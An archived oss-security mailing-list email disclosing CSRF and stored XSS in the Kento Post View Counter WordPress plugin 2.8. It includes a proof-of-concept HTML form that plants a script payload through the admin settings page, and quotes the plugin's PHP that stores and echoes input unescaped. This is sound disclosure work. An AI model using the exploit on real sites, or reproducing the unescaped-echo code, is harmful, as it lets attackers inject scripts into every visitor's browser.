X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4582" "Saturday" "16" "April" "2016" "13:46:21" "+0530" "shravan kumar" "cor3sm4sh3r@gmail.com" "<CAOmn9FQsQy9mCApHvaV-BCKiXM8M297K3iCLz-dUBMueHMu=BQ@mail.gmail.com>" "164" "[oss-security] CSRF and Stored XSS in Kento post viewer counter wordpress Plugin 2.8" nil nil nil "4" "2016041608:16:21" "[oss-security] CSRF and Stored XSS in Kento post viewer counter wordpress Plugin 2.8" (number mark "U       cor3sm4sh3r@ Apr 16  164/4582  " thread-indent "\"[oss-security] CSRF and Stored XSS in Kento post viewer counter wordpress Plugin 2.8\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 24265 invoked by uid 550); 16 Apr 2016 09:26:10 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28078 invoked from network); 16 Apr 2016 08:16:33 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to;
        bh=TpzrEiq5ndtIyvqAI09UbWy8NKzjCP6/EMNkYN09rro=;
        b=iaZEnCggcuxDjnixKeTYMEONJAY030awbnhcIwEyHw7IHmxtlPwXbqZskwWYY7Ia7v
         Gxem9xICU4GDmvQH46XGrKP+JbzWCVNI4tW5lqs2xeJp3JjdHF8ezYdmssd+6zMGJn5Q
         +e1Wy0Du4Q7ve/8WYsVkCeu0jRNPvHznRiiSkfvc6PCRV5B+fzxCoiGAev9JCR9OLlGJ
         65mU1oBhZg10OQL2jeIW/fspUP21BUeTQS86Nnl+Xe9yo+OdmmDcCntKq0kyN4dkppta
         HJu6vHSnikJ1ZqMOaNj3gJ0orDPmVMp52PBAkhSRrALaCI7aXQ75G3W5s4p9lQDTjlG0
         1Mnw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to;
        bh=TpzrEiq5ndtIyvqAI09UbWy8NKzjCP6/EMNkYN09rro=;
        b=dnxysV1Grw2ifMYEevBobEuy5KNz0fYmhm8fRgTFggdWO38wrSyjuCTNI/2sMwADah
         v7D7PzFE50f6QtLJtiwiOpXjtCaKWKUwcom7FLJsV6HOtvsBum/qavYyrllZ6zUzl7zk
         otSJhB5A6UCvGm1a/NL/7igxJSXQx2Ix6FY50QMDYWi2Ox8cP83deNYkf0c/XilVV7J+
         Smh/YN/4DWy4GeG31i1mp0A0mU6jsmQT9gdPX9jWx6y13B0zz1DLT5+yipOT5mU5+1PD
         wr6ZcJvkOhNoVP9JmeTl4hHfXihXjGh3V6XlAVuy3v0zW5YjXGO7mUlA2L6oWW5lxQZ2
         g/yg==
X-Gm-Message-State: AOPr4FW3vPrrJn8lLwKoyYY5Yg7bpX2jNkMUYezY9BOGALplCxTy+fWNtfxjQQ8udPaKio27B1Hed+iDnrOOsg==
MIME-Version: 1.0
X-Received: by 10.107.140.202 with SMTP id o193mr27438321iod.161.1460794581374;
 Sat, 16 Apr 2016 01:16:21 -0700 (PDT)
Date: Sat, 16 Apr 2016 13:46:21 +0530
Message-ID: <CAOmn9FQsQy9mCApHvaV-BCKiXM8M297K3iCLz-dUBMueHMu=BQ@mail.gmail.com>
From: shravan kumar <cor3sm4sh3r@gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=94eb2c060bfe1ce0d4053095bec0
Subject: [oss-security] CSRF and Stored XSS in Kento post viewer counter wordpress Plugin 2.8

--94eb2c060bfe1ce0d4053095bec0
Content-Type: text/plain; charset=UTF-8

Hello ,

I would like to disclose  CSRF and stored XSS vulnerability in Kento post
view counter plugin version 2.8 .

The vulnerable Fields for XSS are

   - kento_pvc_numbers_lang
   - kento_pvc_today_text
   - kento_pvc_total_text

The combination of CSRF and XSS in this plugin can lead to huge damage of
the website, as the two fields kento_pvc_today_text and
kento_pvc_total_text are reflected on all authenticated users as well as
non-authenticated user ,all the post have a footer which shows this two
parameter reflected in them ,so if an attacker successfully attacks a
website almost all the pages on that website will execute the malicious
javascript payload on all the clients browsers visiting that website.every
user visiting the website will be affected.




The plugin can be found at
https://wordpress.org/plugins/kento-post-view-counter/


This CSRF is tested on latest wordpress installation 4.4.2 using firefox
browser.  and chrome.


The Code for CSRF.html is

<html>
  <body>
    <form action="
http://targetsite/wp-admin/admin.php?page=kentopvc_settings" method="POST">
      <input type="hidden" name="kentopvc_hidden" value="Y" />
      <input type="hidden" name="option_page"
value="kento_pvc_plugin_options" />
      <input type="hidden" name="action" value="update" />
      <input type="hidden" name="_wpnonce" value="" />
      <input type="hidden" name="_wp_http_referer" value="" />
      <input type="hidden" name="kento_pvc_posttype[post]" value="1" />
      <input type="hidden" name="kento_pvc_posttype[page]" value="1" />
      <input type="hidden" name="kento_pvc_posttype[attachment]" value="1"
/>
      <input type="hidden" name="kento_pvc_posttype[revision]" value="1" />
      <input type="hidden" name="kento_pvc_posttype[nav_menu_item]"
value="1" />
      <input type="hidden" name="kento_pvc_numbers_lang" value="" />
      <input type="hidden" name="kento_pvc_today_text"
value="&#x22;<script>alert(1);</script><img
src=&#x22;b" />
      <input type="hidden" name="kento_pvc_total_text" value="" />
      <input type="hidden" name="Submit" value="Save Changes" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

The Vulnerable page is

wp-content\plugins\kento-post-view-counter\kento-pvc-admin.php

The code Reponsible for XSS :

if($_POST['kentopvc_hidden'] == 'Y') {
//Form data sent
if(empty($_POST['kento_pvc_hide']))
{
$kento_pvc_hide ="";
}
else
{
$kento_pvc_hide = $_POST['kento_pvc_hide'];
}
update_option('kento_pvc_hide', $kento_pvc_hide);



if(empty($_POST['kento_pvc_posttype']))
{
$kento_pvc_posttype ="";
}
else
{
$kento_pvc_posttype = $_POST['kento_pvc_posttype'];
}
update_option('kento_pvc_posttype', $kento_pvc_posttype);
if(empty($_POST['kento_pvc_uniq']))
{
$kento_pvc_uniq ="";
}
else
{
$kento_pvc_uniq = $_POST['kento_pvc_uniq'];
}
update_option('kento_pvc_uniq', $kento_pvc_uniq);


$kento_pvc_numbers_lang = $_POST['kento_pvc_numbers_lang'];
update_option('kento_pvc_numbers_lang', $kento_pvc_numbers_lang);

$kento_pvc_today_text = $_POST['kento_pvc_today_text'];
update_option('kento_pvc_today_text', $kento_pvc_today_text);

$kento_pvc_total_text = $_POST['kento_pvc_total_text'];
update_option('kento_pvc_total_text', $kento_pvc_total_text);


--------------------------snip-----------------------
------------------snip ------------------------------




<input type="text" size="20" name="kento_pvc_numbers_lang"
id="kento-pvc-numbers-lang"   value ="<?php if
(isset($kento_pvc_numbers_lang)) echo $kento_pvc_numbers_lang; ?>"
placeholder="0,1,2,3,4,5,6,7,8,9"   /><br />**Write numbers in your
language as following 0,1,2,3,4,5,6,7,8,9<br />
   Left blank if you are in English.



<tr valign="top">
<th scope="row">Text For Today View</th>
<td style="vertical-align:middle;">

   <input type="text" size="20" name="kento_pvc_today_text"
id="kento-pvc-today-text"   value ="<?php if (isset($kento_pvc_today_text))
echo $kento_pvc_today_text; ?>" placeholder="Views Today "   />

</td>
</tr>


<tr valign="top">
<th scope="row">Text For Total View</th>
<td style="vertical-align:middle;">

   <input type="text" size="20" name="kento_pvc_total_text"
id="kento-pvc-total-text"   value ="<?php if (isset($kento_pvc_total_text))
echo $kento_pvc_total_text; ?>" placeholder="Total Views "   />

</td>
</tr>



No anti-CSRF token used on this form  :

All though the WordPress sends the _wpnonce value but it does not protect
this form against CSRF.


-- 
Shravan Kumar

--94eb2c060bfe1ce0d4053095bec0--
